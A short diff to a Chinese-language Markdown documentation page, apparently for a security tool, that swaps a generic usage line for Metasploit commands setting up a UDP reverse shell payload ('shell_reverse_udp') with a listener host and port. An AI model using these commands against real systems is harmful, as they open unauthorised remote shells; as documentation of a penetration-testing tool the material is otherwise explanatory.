@@ -8,8 +8,11 @@
 
 ## 命令示例
 ```bash
-# 基本用法
-generic_send_udp [参数]
+# UDP 发送 payload
+# 在 Metasploit 中使用
+use payload/generic/shell_reverse_udp
+set LHOST 192.168.1.100
+set LPORT 4444
 ```
 
 ## 使用场景
